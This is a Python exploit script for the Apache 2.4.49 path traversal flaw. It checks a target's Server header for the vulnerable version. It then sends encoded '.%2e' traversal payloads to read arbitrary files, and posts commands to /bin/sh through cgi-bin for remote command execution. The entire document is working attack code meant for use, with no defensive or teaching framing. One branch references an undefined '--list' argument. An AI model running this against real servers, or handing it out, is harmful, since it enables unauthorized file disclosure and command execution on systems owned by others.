import requests, argparse
from urllib import request

parser = argparse.ArgumentParser()
parser.add_argument('--url', action='store', dest='url', required=True, help='Target url.')
parser.add_argument('--path', action='store', dest='path', required=False, help='Path to read in host.')
parser.add_argument('--cmd', action='store', dest='cmd', required=False, help='Command to execute in host.')
arguments = parser.parse_args()
targets = []
commands = []
file = []

def doRequest(url):
    return requests.get(url)

def checkTarget(request):
    for header in request.headers.items():
        if "Apache/2.4.49" in header[1]:
            return True
    return False

def pathTraversal(url, path):
    payload = str(url[0]) + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e" + str(path[0])
    print(payload + '\n')
    response = request.urlopen(payload)
    print(response.read().decode('utf-8'))

def remoteCommandExecution(targets, cmd):
    user_agent = 'Mozilla/5.0 (Windows NT 10.5; x64) Gecko/20100101 Firefox/50.3'
    payload = str(targets[0]) + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    data = 'echo;' + str(cmd[0])
    data = data.encode("ascii")
    try:
        req = request.Request(payload, data=data, headers={'User-Agent': user_agent})
        response = request.urlopen(req)
        print(response.read().decode('utf-8'))
    except:
        print("[!] Command execution failed... ")

def main(targets):
    for target in targets:
        print("\n[+] Target: " + target)
        check = checkTarget(doRequest(target))
        if check == True:
            print('[+] Vulnerable! ' + target)
        else:
            print('[!] Not vulnerable ' + target)

if(arguments.url != None and arguments.path == None and arguments.cmd == None):
    targets.append(arguments.url)
    main(targets)

elif(arguments.url != None and arguments.path != None and arguments.cmd == None):
    targets.append(arguments.url)
    file.append(arguments.path)  
    pathTraversal(targets, file)

elif(arguments.url != None and arguments.path == None and arguments.cmd != None):
    targets.append(arguments.url)
    commands.append(arguments.cmd)  
    remoteCommandExecution(targets, commands)

elif(arguments.url == None and arguments.path == None and arguments.cmd == None):
    print('You are lost? Look at help bro!!!')
    exit()

else:
    try:
        target_list = open(arguments.list, 'r', errors='ignore')
        for target in target_list.read().splitlines():
            targets.append(target)
        main(targets)

    except FileNotFoundError:
        print('[-] File with url not found.')
        exit()
